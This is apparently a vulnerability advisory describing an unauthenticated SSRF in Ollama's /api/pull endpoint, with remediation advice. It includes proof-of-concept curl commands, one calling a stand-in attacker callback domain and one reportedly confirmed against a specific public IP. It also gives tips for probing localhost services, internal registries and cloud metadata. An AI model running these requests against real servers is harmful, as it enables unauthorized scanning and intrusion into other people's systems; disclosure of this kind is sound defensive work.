# Ollama SSRF via /api/pull Registry Injection

**Discovered:** 2026-05-01  
**Severity:** MEDIUM  
**Affected versions:** All Ollama versions  

---

## Summary

Ollama's `/api/pull` endpoint accepts a model name in the format `host:port/namespace/model:tag` as a private registry specifier. Ollama resolves the host via DNS and makes an HTTPS GET request to `/v2/<namespace>/<model>/manifests/<tag>`. This is an unauthenticated SSRF primitive: any actor with access to `:11434` can force the Ollama server to make outbound HTTPS connections to attacker-specified hosts, including internal services.

---

## Mechanism

```
POST /api/pull
{"model": "<attacker-registry>/<namespace>/<model>:<tag>"}
```

Ollama parses the model string as an OCI registry reference. If the host portion is an IP:port or hostname:port, Ollama connects to that as a registry endpoint:

```
GET https://<host>:<port>/v2/<namespace>/<model>/manifests/<tag>
```

The request includes standard OCI registry headers but no operator credentials.

---

## Proof of Concept

### OOB DNS Exfiltration
```bash
# Replace with an OOB DNS collector (interact.sh, Burp Collaborator, etc.)
curl -X POST http://TARGET:11434/api/pull \
  -H "Content-Type: application/json" \
  -d '{"model":"callback.attacker-oob-domain.com/test/canary:1"}'
```
Target Ollama performs DNS lookup for `callback.attacker-oob-domain.com`, OOB DNS hit confirmed.

### Localhost SSRF: Confirmed on 93.123.109.107
```bash
curl -X POST http://93.123.109.107:11434/api/pull \
  -H "Content-Type: application/json" \
  -d '{"model":"127.0.0.1:8888/probe/hexstrike:latest"}'
```
Response:
```json
{"error":"pull model manifest: Get \"https://127.0.0.1:8888/v2/probe/hexstrike/manifests/latest\": dial tcp 127.0.0.1:8888: connect: connection refused"}
```

The error `connection refused` (vs `no such host`) confirms the SSRF fired against localhost. The target Ollama process attempted the connection to `127.0.0.1:8888`.

---

## Constraints

| Constraint | Detail |
|------------|--------|
| Protocol | HTTPS only (Ollama always uses TLS for registry) |
| Method | GET only |
| Path | Must match `/v2/<ns>/<name>/manifests/<tag>` |
| Body | None, GET request |
| TLS | Target validates cert unless server is `http://`, but `http://` prefix causes name parse failure |

**Effective for:** OOB DNS confirmation, port-state detection (ECONNREFUSED vs timeout vs TLS error reveals open/closed/filtered), internal HTTPS registry enumeration.

**Not effective for:** Reaching non-HTTPS services, POST/PUT to internal APIs, arbitrary path access.

---

## Chaining

On a host running HexStrike AI (`hexstrike_server.py` on localhost:8888), this SSRF can probe:
- `127.0.0.1:8888`, Flask server port-state detection
- Other internal services on non-standard ports
- Internal OCI/Docker registries (standard port 5000 / 443 / 5001)

If the target is in a cloud VPC, this probes cloud metadata:
- AWS: `169.254.169.254:80`, but path must be `/v2/.../manifests/...` and HTTPS required
- GCP: `metadata.google.internal:80`, same constraint

---

## Remediation

Same as model injection: bind Ollama to loopback only. The SSRF vector disappears when port 11434 is not publicly accessible.
